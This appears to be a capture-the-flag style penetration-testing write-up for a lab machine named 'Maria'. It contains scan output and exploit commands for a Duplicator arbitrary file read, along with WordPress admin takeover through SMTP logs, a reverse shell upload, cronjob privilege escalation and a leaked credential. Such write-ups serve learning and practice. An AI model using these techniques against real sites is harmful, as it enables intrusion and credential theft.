# Maria \[Inter]

## Report

Vulnerable plugins, 'duplicator' and 'easy-wp-smtp' are vulnerable to arbritary file read and information disclosure via logs respectively. MySQL version '5.5.5' is also vulnerable to RCE as user 'mysql' and expose creds via duplicator LFI to reveal database creds but it's a rabbit hole via wp-config.php. FTP anonymous file access was denied but was visible via LFI exploit (read FTP anon root first) and read the cronjob running binary 'automysqlbackup' which further reveals more database creds which get accepted this time but not enough for SQL RCE to work.

'easy-wp-smtp' can read SMTP debug log files which store all communications in plaintext. We need to generate an email first. Reset password for user admin (google also suggests the same) and find the log file location via 'wp\_options' table from MySQL db and access the reset password link and login as admin to upload PHP reverse shell.

The cronjob running as root executes a file which is owned by user 'joseph', modify it to spawn a new shell as root.

## Enumeration

192.168.156.167

21, 22, 80, 3306

```
21/tcp    open   ftp       vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    5 0        0            4096 Sep 21  2018 automysqlbackup
22/tcp    open   ssh       OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open   http      Apache httpd 2.4.38
| http-methods: 
|_  Supported Methods: HEAD
3306/tcp  open   mysql     MySQL 5.5.5-10.3.27-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 24
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, SupportsTransactions, Speaks41ProtocolOld, IgnoreSigpipes, InteractiveClient, LongColumnFlag, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsLoadDataLocal, SupportsCompression, FoundRows, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: A2sq_e_/f9)_'?I0T8Y7
|_  Auth Plugin Name: mysql_native_password

```

We have a MySQL RCE exploit but need creds (MySQL 5.5.5-10.3.27-MariaDB)

WordPress don't even have plugins this time&#x20;

FTP don't allow random access

Aint forget bout these \
\| Salt: A2sq\_e\_/f9)_'_?I0T8Y7 | Auth Plugin Name: mysql\_native\_password

#### 21 (FTP)

Cannot download files - access denied for Anonymous

#### 80 (WordPress)

```
[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.225.167/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.225.167/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.225.167/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.225.167/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7.1 identified (Insecure, released on 2021-04-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.225.167/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.225.167/, Match: 'WordPress 5.7.1'
 
 [+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

Did not find plugins again jeez

```
wpscan --url http://192.168.195.167/ -e ap --plugins-detection aggressive
[+] akismet
 | Location: http://192.168.183.167/wp-content/plugins/akismet/
 | Latest Version: 5.5
 | Last Updated: 2025-07-15T18:17:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.183.167/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] duplicator
 | Location: http://192.168.183.167/wp-content/plugins/duplicator/
 | Last Updated: 2025-09-12T16:17:00.000Z
 | Readme: http://192.168.183.167/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.13.3
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.183.167/wp-content/plugins/duplicator/, status: 200
 |
 | Version: 1.3.26 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.183.167/wp-content/plugins/duplicator/readme.txt

[+] easy-wp-smtp
 | Location: http://192.168.183.167/wp-content/plugins/easy-wp-smtp/
 | Last Updated: 2025-09-01T11:49:00.000Z
 | Readme: http://192.168.183.167/wp-content/plugins/easy-wp-smtp/readme.txt
 | [!] The version is out of date, the latest version is 2.12.0
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.183.167/wp-content/plugins/easy-wp-smtp/, status: 200
 | Version: 1.4.1 (100% confidence)
```

## Loot

### Initial Foothold

Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (**50420)**

```
python3 50420.py http://192.168.183.167 /etc/apache2/sites-enabled/000-default.conf
DocumentRoot /var/www/html/wordpress

/var/www/html/wordpress/wp-config.php

define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'wordpress' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

can't login to sql as user wordrpress, enumerate FTP using our LFI exploit

`python3 50420.py http://192.168.183.167 /etc/vsftpd.conf`

`anon_root=/srv/ftp`

Read the initial binary from ftp for mysqlautomate, mentions if a file exists, run the binary, go check that file

```
python3 50420.py http://192.168.183.167 /srv/ftp/automysqlbackup/usr/sbin/automysqlbackup
python3 50420.py http://192.168.183.167 /etc/default/automysqlbackup
```

Running MySQL exploit RCE for that&#x20;

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption><p>Rabbit hole</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption><p>Perform password reset first</p></figcaption></figure>

Become admin and upload revshell

### PrivEsc

The cronjob running, yeah

### Creds

backup:EverydayAndEverynight420

### Proof
